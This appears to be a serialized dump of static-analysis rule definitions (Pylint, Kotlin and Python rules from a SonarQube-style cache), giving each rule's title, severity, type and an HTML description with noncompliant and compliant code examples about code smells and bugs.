PylintE1605Use of the `` operator"MAJOR*py2E1605:XUsed when the deprecated "``" (backtick) operator is used instead of the str() function.Z
CODE_SMELL
ù
Pylint:E1601å
PylintE1601print statement used"MAJOR*py2E1601:GUsed when a print statement is used (`print` is a function in Python 3)Z
CODE_SMELL
˛
Pylint:F0202Ì
PylintF0202!Unable to check methods signature"MAJOR*py2F0202:öUsed when Pylint has been unable to check methods signature compatibility for an unexpected reason. Please report this kind if you don't make sense of it.Z
CODE_SMELL
å
Pylint:E1610˚
PylintE1610-Non-ascii bytes literals not supported in 3.x"MAJOR*py2E1610:úUsed when non-ascii bytes literals are found in a program. They are no longer supported in Python 3. This message can't be emitted when using Python >= 3.0.Z
CODE_SMELL
Ã
Pylint:F0321ª
PylintF0321Format detection error"MAJOR*py2F0321:tUsed when an unexpected error occurred in bad format
               detection. Please report the error if it occurs.Z
CODE_SMELL
•
Pylint:F0220î
PylintF0220Failed to resolve interfaces"MAJOR*py2F0220:GUsed when a Pylint as failed to find interfaces implemented by a class.Z
CODE_SMELL
Ã
Pylint:W0312ª
PylintW0312Mixed tabs/spaces indentation"MAJOR*py2W0312:ÏUsed when there are some mixed tabs and spaces in a
               module.
               <p>As indentation is part of Python's syntax,
               inconsistencies in its usage are usually considered a
               major issue.</p>Z
CODE_SMELL
§
Pylint:F0004ì
PylintF0004Unexpected inferred value"MAJOR*py2F0004:IUsed to indicate that some value of an unexpected type has been inferred.Z
CODE_SMELL
∞
Pylint:F0003ü
PylintF0003Ignored builtin module"MAJOR*py2F0003:XUsed to indicate that the user asked to analyze a builtin module which has been skipped.Z
CODE_SMELL
¡
Pylint:F0001∞
PylintF0001Analysis failed"MAJOR*py2F0001:pUsed when an error occurred preventing the analysis of a
               module (unable to find it for instance).Z
CODE_SMELL
Ò
Pylint:F0002‡
PylintF0002Internal Pylint error"MAJOR*py2F0002:ôUsed when an unexpected error occurred while building the Astroid representation. This is usually accompanied by a traceback. Please report such errors !Z
CODE_SMELL
È
Pylint:E0202ÿ
PylintE0202)Method hidden by attribute of super class"MAJOR*py2E0202:~Used when a class defines a method which is hidden by an instance attribute from an ancestor class or set by some client code.Z
CODE_SMELL
Ø
Pylint:E0203û
PylintE0203&Access to member before its definition"MAJOR*py2E0203:GUsed when an instance member is accessed before it's actually assigned.Z
CODE_SMELL
∆
Pylint:F0010µ
PylintF0010Error while code parsing"MAJOR*py2F0010:lUsed when an exception occurred while building the Astroid representation which could be handled by astroid.Z
CODE_SMELL
ƒ
Pylint:E1305≥
PylintE1305$Too many arguments for format string"MAJOR*py2E1305:^Used when a format string that uses unnamed conversion specifiers is given too many arguments.Z
CODE_SMELL
ƒ
Pylint:E1306≥
PylintE1306&Not enough arguments for format string"MAJOR*py2E1306:\Used when a format string that uses unnamed conversion specifiers is given too few argumentsZ
CODE_SMELL
ö
Pylint:E0213â
PylintE0213+Method should have "self" as first argument"MAJOR*py2E0213:¨Used when a method has an attribute different the "self" as first argument. This is considered as an error since this is a so common convention that you shouldn't break it!Z
CODE_SMELL
ƒ
Pylint:E1301≥
PylintE13014Format string ends in middle of conversion specifier"MAJOR*py2E1301:NUsed when a format string terminates before the end of a conversion specifier.Z
CODE_SMELL
‹
Pylint:E1302À
PylintE1302?Mixing named and unnamed conversion specifiers in format string"MAJOR*py2E1302:⁄Used when a format string contains both named (e.g. '%(foo)d') and unnamed (e.g. '%d') conversion specifiers. This is also used when a named conversion specifier contains * for the minimum field width and/or precision.Z
CODE_SMELL
”
Pylint:E1303¬
PylintE1303"Expected mapping for format string"MAJOR*py2E1303:oUsed when a format string that uses named conversion specifiers is used with an argument that is not a mapping.Z
CODE_SMELL
Ñ
Pylint:E1304Û
PylintE1304'Missing key in format string dictionary"MAJOR*py2E1304:öUsed when a format string that uses named conversion specifiers is used with a dictionary that doesn't contain all the keys required by the format string.Z
CODE_SMELL
∫
Pylint:E0211©
PylintE0211Method has no argument"MAJOR*py2E0211:bUsed when a method which should have the bound instance as first argument has no argument defined.Z
CODE_SMELL
£
Pylint:E1300í
PylintE1300Unsupported format character"MAJOR*py2E1300:EUsed when an unsupported format character is used in a format string.Z
CODE_SMELL
æ
Pylint:W1659≠
PylintW1659(Accessing a removed xreadlines attribute"MAJOR*py2W1659:TUsed when accessing the xreadlines() function on a file stream, removed in Python 3.Z
CODE_SMELL
Ò
Pylint:E0107‡
PylintE0107Use of a non-existent operator"MAJOR*py2E0107:êUsed when you attempt to use the C-style pre-increment or pre-decrement operator -- and ++, which doesn't exist in Python.
               <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3APreIncrementDecrement'>PreIncrementDecrement</a> instead.</p>Z
CODE_SMELL
î
Pylint:E0106É
PylintE0106%Return with argument inside generator"MAJOR*py2E0106:¨Used when a "return" statement with an argument is found outside in a generator function or method (e.g. with some "yield" statements). This message can't be emitted when using Python >= 3.3.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS2712'>S2712</a> instead.</p>Z
CODE_SMELL
î
Pylint:E0102É
PylintE0102Redefined function/class/method"MAJOR*py2E0102:3Used when a function / class / method is redefined.Z
CODE_SMELL
ù
Pylint:E0103å
PylintE01030Usage of 'break' or 'continue' outside of a loop"MAJOR*py2E0103:™Used when break or continue keywords are used outside a loop.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS1716'>S1716</a> instead.</p>Z
CODE_SMELL
å
Pylint:E0104˚
PylintE0104Return outside function"MAJOR*py2E0104:≤Used when a "return" statement is found outside a function or method.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS2711'>S2711</a> instead.</p>Z
CODE_SMELL
ä
Pylint:E0105˘
PylintE0105Yield outside function"MAJOR*py2E0105:±Used when a "yield" statement is found outside a function or method.
      <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS2711'>S2711</a> instead.</p>Z
CODE_SMELL
·
Pylint:E0100–
PylintE0100__init__ method is a generator"MAJOR*py2E0100:ÄUsed when the special class method __init__ is turned
               into a generator by a yield in its body.
               <p>The __init__() method is required to return nothing. Python 2.7 and 3.x
               raise a TypeError when __init__() is called and executes a yield
               statement. Pylint reports this error without depending on the actual
               invocation.</p>
               <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS2734'>S2734</a> instead.</p>Z
CODE_SMELL
Î
Pylint:E0101⁄
PylintE0101Explicit return in __init__"MAJOR*py2E0101:çUsed when the special class method __init__ has an
               explicit return value.
               <p>The __init__() method is required to return
               nothing. Python raises a TypeError when __init__() is
               called and executes a return statement with a value other than
               None. Pylint reports this error without depending on the actual
               invocation.</p>
               <p>This rule is deprecated, use <a href='/coding_rules#rule_key=python%3AS2734'>S2734</a> instead.</p>Z
CODE_SMELL
Ø
Pylint:E0221û
PylintE0221%Implemented interface must be a class"MAJOR*py2E0221:HUsed when a class claims to implement an interface which is not a class.Z
CODE_SMELL
ø
Pylint:E0222Æ
PylintE0222Missing method from interface"MAJOR*py2E0222:`Used when a method declared in an interface is missing from a class implementing this interface.Z
CODE_SMELL
≠
Pylint:E1206ú
PylintE1206.Not enough arguments for logging format string"MAJOR*py2E1206:=Used when a logging format string is given too few arguments.Z
CODE_SMELL
√
Pylint:E0117≤
PylintE0117#Nonlocal name found without binding"MAJOR*py2E0117:^Emitted when a nonlocal variable does not have an attached name somewhere in the parent scopesZ
CODE_SMELL
º
Pylint:E0113´
PylintE01134Starred assignment target must be in a list or tuple"MAJOR*py2E0113:FEmitted when a star expression is used as a starred assignment target.Z
CODE_SMELL
π
Pylint:E0114®
PylintE01144Can use starred expression only in assignment target"MAJOR*py2E0114:CEmitted when a star expression is not used in an assignment target.Z
CODE_SMELL
å
Pylint:E0115|
PylintE0115Name is nonlocal and global"MAJOR*py2E0115:0Emitted when a name is both nonlocal and global.Z
CODE_SMELL
¨
Pylint:E1205õ
PylintE1205,Too many arguments for logging format string"MAJOR*py2E1205:>Used when a logging format string is given too many arguments.Z
CODE_SMELL
ÿ
Pylint:E0112«
PylintE0112.More than one starred expression in assignment"MAJOR*py2E0112:hEmitted when there are more than one starred expressions (`*x`) in an assignment. This is a SyntaxError.Z
CODE_SMELL
Ω
Pylint:E1200¨
PylintE1200$Unsupported logging format character"MAJOR*py2E1200:WUsed when an unsupported format character is used in a logging statement format string.Z
CODE_SMELL
ﬁ
Pylint:E1201Õ
PylintE1201<Logging format string ends in middle of conversion specifier"MAJOR*py2E1201:`Used when a logging statement format string terminates before the end of a conversion specifier.Z
CODE_SMELL
}
Pylint:E0001m
PylintE0001Syntax error"MAJOR*py2E0001:0Used when a syntax error is raised for a module.Z
CODE_SMELL
ö
Pylint:E0011â
PylintE0011Unrecognized file option"MAJOR*py2E0011:øUsed when an unknown inline option is encountered.
               <p>Note that options can be specified in the
               configuration file and can be overridden on the command line.</p>Z
CODE_SMELL
Ç
Pylint:E1103Ò
PylintE1103:Accessing nonexistent member (type information incomplete)"MAJOR*py2E1103:ÖUsed when a variable is accessed for an nonexistent member, but Pylint was not able to interpret all possible types of this variable.Z
CODE_SMELL
ò
Pylint:E1101á
PylintE1101Access of nonexistent member"MAJOR*py2E1101::Used when a variable is accessed for an unexistent member.Z
CODE_SMELL
•
Pylint:E1102î
PylintE1102Calling of not callable"MAJOR*py2E1102:LUsed when an object being called has been inferred to a non callable object.Z
CODE_SMELL
ﬂ
Pylint:E0012Œ
PylintE0012Bad option value"MAJOR*py2E0012:åUsed when a bad value for an inline option is encountered.
               <p>The option exists but its value is not valid. The options can be
               specified in the Pylint configuration file and can be overridden in
               the Pylint command line.</p>Z
CODE_SMELL
Œ
kotlin:S1134Ω
kotlinS1134Track uses of "FIXME" tags"MAJOR*kotlin:Ù<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
// FIXME denominator value might be  0
fun divide(numerator: Int, denominator: Int): Int = numerator / denominator
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
¥
kotlin:S1110£
kotlinS11100Redundant pairs of parentheses should be removed"MAJOR*kotlin:ƒ<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
val x = (y / 2 + 1)  // Compliant even if the parentheses are ignored by the compiler

if (a &amp;&amp; ((x + y &gt; 0))) {  // Noncompliant
  //...
}

return ((x + 1))  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
val x = (y / 2 + 1)

if (a &amp;&amp; (x + y &gt; 0)) {
  //...
}

return (x + 1)
</pre>Z
CODE_SMELL
≈
kotlin:S1871¥
kotlinS1871WTwo branches in a conditional structure should not have exactly the same implementation"MAJOR*kotlin:Æ<p>Having two clauses in a <code>when</code> statement or two branches in an <code>if</code> chain with the same implementation is at best duplicate
code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should be combined, or
for a <code>when</code>, duplicates should be refactored. </p>
<h2>Noncompliant Code Example</h2>
<pre>
fun s1871(x: Int) {
    when (x) {
        1 -&gt; {
            val y = x / 2
            print(y)
        }
        2 -&gt; {
            val y = x / 2
            print(y)
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>when</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>
<pre>
if (a == 1) {
    doSomething()  //no issue, usually this is done on purpose to increase the readability
} else if (a == 2) {
    doSomethingElse()
} else {
    doSomething()
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>when</code>-es without <code>else</code>
clauses when all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>when</code>-es
with default clauses, rule <a href='/coding_rules#rule_key=kotlin%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if (a == 1) {
  doSomething()  //Noncompliant, this might have been done on purpose but probably not
} else if (a == 2) {
  doSomething()
}
</pre>Z
CODE_SMELL
Ò
kotlin:S4144‡
kotlinS41443Functions should not have identical implementations"MAJOR*kotlin:˛<p>When two functions have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but
may be confusing to maintainers. In the latter case, the code should be refactored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {
  fun calculateCode(): String {
    doTheThing()
    doOtherThing()
    return "done"
  }

  fun getStatus(): String {  // Noncompliant
    doTheThing()
    doOtherThing()
    return "done"
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  fun calculateCode(): String {
    doTheThing()
    doOtherThing()
    return "done"
  }

  fun getStatus(): String = calculateCode()
}
</pre>
<h2>Exceptions</h2>
<p>Methods with fewer than 2 statements are ignored.</p>Z
CODE_SMELL
¬
kotlin:ParsingError™
kotlinParsingErrorKotlin parser failure"MAJOR*kotlin:ﬂ<p>When the parser fails, it is possible to record the failure as an issue on the file. This way, not only is it possible to track the number of files
that do not parse but also to easily find out why they do not parse.</p>Z
CODE_SMELL
›
kotlin:S1656Ã
kotlinS1656%Variables should not be self-assigned"MAJOR*kotlin:ˇ<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
fun doSomething() {
    var name = ""
    // ...
    name = name
}
</pre>
<h2>Compliant Solution</h2>
<pre>
fun doSomething() {
    var name = ""
    // ...
    this.name = name
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
ª
kotlin:S125´
kotlinS125,Sections of code should not be commented out"MAJOR*kotlin:—<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.4 - Sections of code should not be "commented out". </li>
  <li> MISRA C++:2008, 2-7-2 - Sections of code shall not be "commented out" using C-style comments. </li>
  <li> MISRA C++:2008, 2-7-3 - Sections of code should not be "commented out" using C++ comments. </li>
  <li> MISRA C:2012, Dir. 4.4 - Sections of code should not be "commented out" </li>
</ul>Z
CODE_SMELL
∆
kotlin:S1479µ
kotlinS14792"when" statements should not have too many clauses"MAJOR*kotlin:‘<p>When <code>when</code> statements have a large number of clauses, it is usually an attempt to map two sets of data. A real map structure would be
more readable and maintainable, and should be used instead.</p>Z
CODE_SMELL
Õ
kotlin:S103Ω
kotlinS103Lines should not be too long"MAJOR*kotlin:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
≥
kotlin:S1151¢
kotlinS11515"when" clauses should not have too many lines of code"MAJOR*kotlin:æ<p>The <code>when</code> statement should be used only to clearly define some new branches in the control flow. As soon as a case clause contains too
many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the case clause should be
extracted into a dedicated function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the threshold set at 5:</p>
<pre>
when (myVariable) {
  0 -&gt; {// Noncompliant: 6 lines till next case
    methodCall1("");
    methodCall2("");
    methodCall3("");
    methodCall4("");
    }
  1 -&gt; {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
when (myVariable) {
  0 -&gt; doSomething()
  1 -&gt; {
    ...
  }
}
...
fun doSomething() {
    methodCall1("");
    methodCall2("");
    methodCall3("");
    methodCall4("");
}
</pre>Z
CODE_SMELL
‰
kotlin:S1172”
kotlinS1172,Unused function parameters should be removed"MAJOR*kotlin:¯<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
„
kotlin:S104”
kotlinS104,Files should not have too many lines of code"MAJOR*kotlin:˘<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
ä
kotlin:S107˙
kotlinS107-Functions should not have too many parameters"MAJOR*kotlin:ü<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>Z
CODE_SMELL
Â
kotlin:S108’
kotlinS108.Nested blocks of code should not be left empty"MAJOR*kotlin:˘<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 42; i++){}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>
<p><code>while</code> and unless loops are also exception to the rule.</p>
<pre>
while (order.processNext());  // Compliant
</pre>Z
CODE_SMELL
©
kotlin:S1764ò
kotlinS1764KIdentical expressions should not be used on both sides of a binary operator"MAJOR*kotlin:•<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Exceptions</h2>
<p>This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=kotlin%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>ZBUG
¡

kotlin:S1763∞

kotlinS17633Jump statements should not be followed by dead code"MAJOR*kotlin:’	<p>Jump statements (<code>return</code>, <code>break</code> and <code>continue</code>) move control flow out of the current code block. So any
statements that come after a jump are dead code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
fun foo(a: Int): Int {
  var i = 10;
  return a + i;       // Noncompliant
  i++;                // dead code
}
</pre>
<h2>Compliant Solution</h2>
<pre>
fun foo(a: Int): Int {
  var i = 10;
  return a + i;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code </li>
  <li> MISRA C++:2008, 0-1-1 - A project shall not contain unreachable code </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code </li>
  <li> MISRA C:2012, 2.1 - A project shall not contain unreachable code </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/561.html">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
¨
kotlin:S1862õ
kotlinS1862BRelated "if/else if" statements should not have the same condition"MAJOR*kotlin:±<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first
one with a condition that evaluates to <code>true</code>. </p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior. </p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
Ü
kotlin:S1144ı
kotlinS1144*Unused "private" methods should be removed"MAJOR*kotlin:ú<p><code>private</code> methods that are never executed are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code
decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>Z
CODE_SMELL
’
kotlin:S1145ƒ
kotlinS1145FUseless "if(true) {...}" and "if(false){...}" blocks should be removed"MAJOR*kotlin:÷
<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true) {
  doSomething()
}
...
if (false) {
  doSomethingElse()
}
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething()
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>ZBUG
ï
kotlin:S1066Ñ
kotlinS1066,Collapsible "if" statements should be merged"MAJOR*kotlin:©<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (file != null) {
  if (file.isFile() || file.isDirectory()) {
    /* ... */
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (file != null &amp;&amp; isFileOrDirectory(file)) {
  /* ... */
}
fun isFileOrDirectory(file: File): Boolean {
    return file.isFile() || file.isDirectory();
}
</pre>Z
CODE_SMELL
¨
kotlin:S122ú
kotlinS122&Statements should be on separate lines"MAJOR*kotlin:»<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
foo(); bar();
</pre>
<h2>Compliant Solution</h2>
<pre>
foo();
bar();
</pre>Z
CODE_SMELL
Ñ
kotlin:S2757Û
kotlinS2757'"=+" should not be used instead of "+=""MAJOR*kotlin:§<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var target = -5
val num = 3

target =- num // Noncompliant; target = -3. Is that really what's meant?
target =+ num // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
var target = -5
val num = 3

target = -num // Compliant; intent to assign inverse value of num is clear
target += num
</pre>ZBUG
±
kotlin:S3923†
kotlinS3923WAll branches in a conditional structure should not have exactly the same implementation"MAJOR*kotlin:°<p>Having all branches in a <code>when</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>when</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
     doOneMoreThing()
} else {
     doOneMoreThing()
}

when (i) {  // Noncompliant
    1 -&gt; doSomething()
    2 -&gt; doSomething()
    3 -&gt; doSomething()
    else -&gt; doSomething()
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>when</code>-es without <code>else</code> clauses.</p>
<pre>
if (b == 0) {
    doOneMoreThing()
} else if (b == 1) {
    doOneMoreThing()
}

</pre>ZBUG
ä
kotlin:S138˙
kotlinS1380Functions should not have too many lines of code"MAJOR*kotlin:ú<p>A function that grows too large tends to aggregate too many responsibilities.</p>
<p>Such functions inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller functions which focus on well-defined tasks.</p>
<p>Those smaller functions will not only be easier to understand, but also probably easier to test.</p>Z
CODE_SMELL
Ä
python:S3358Ô
pythonS3358,Conditional expressions should not be nested"MAJOR*py:ò<p>Just because you <em>can</em> do something, doesn't mean you should, and that's the case with nested conditional expressions. Nesting conditional
expressions results in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future
you) scratching their heads and cursing.</p>
<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def get_title(person):
    return "Mr. " if person.gender == Person.MALE else "Mrs. " if person.is_married() else "Miss "  # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
def get_title(person):
    if person.gender == Person.MALE:
        return "Mr. "
    return "Mrs. " if person.is_married() else "Miss "
</pre>
<h2>Exceptions</h2>
<p>No issue is raised on conditional expressions in comprehensions.</p>Z
CODE_SMELL
Œ
python:S1134Ω
pythonS1134Track uses of "FIXME" tags"MAJOR*py:¯<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def divide(numerator, denominator):
  return numerator / denominator              # FIXME denominator value might be 0
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
»
python:ParsingError∞
pythonParsingErrorPython parser failure"MAJOR*py:È<p>When the Python parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the
number of files that do not parse but also to easily find out why they do not parse.</p>Z
CODE_SMELL
’
python:LineLengthø
python
LineLengthLines should not be too long"MAJOR*py:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
´
python:S1854ö
pythonS1854$Unused assignments should be removed"MAJOR*py:À
<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def func(a, b, compute):
    i = a + b  # Noncompliant; calculation result not used before value is overwritten
    i = compute()  # Noncompliant; the value is not used before leaving the function
</pre>
<h2>Compliant Solution</h2>
<pre>
def func(a, b, compute):
    i = a + b
    i += compute()
    return i
</pre>
<h2>Exceptions</h2>
<p>This rule ignores initializations to -1, 0, 1, <code>None</code>, <code>True</code>, <code>False</code> and <code>""</code>.</p>
<p>No issue will be raised on unpacked variables.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>Z
CODE_SMELL
Ï
python:S1656€
pythonS1656%Variables should not be self-assigned"MAJOR*py:í<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
name = name
</pre>
<h2>Compliant Solution</h2>
<pre>
name = other.name
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
ﬂ
python:S104œ
pythonS104,Files should not have too many lines of code"MAJOR*py:˘<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
ò
python:S107à
pythonS107BFunctions, methods and lambdas should not have too many parameters"MAJOR*py:ú<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
def do_something(param1, param2, param3, param4, param5):
	...
</pre>
<h2>Compliant Solution</h2>
<pre>
def do_something(param1, param2, param3, param4):
	...
</pre>Z
CODE_SMELL
®
python:S108ò
pythonS108.Nested blocks of code should not be left empty"MAJOR*py:¿<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for i in range(3):
    pass
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>Z
CODE_SMELL

python:S1066ﬂ
pythonS1066,Collapsible "if" statements should be merged"MAJOR*py:à<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if condition1:
    if condition2:
        # ...
</pre>
<h2>Compliant Solution</h2>
<pre>
if condition1 and condition2:
    # ...
</pre>Z
CODE_SMELL
Ë
python:S1542◊
pythonS15425Function names should comply with a naming convention"MAJOR*py:˜<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
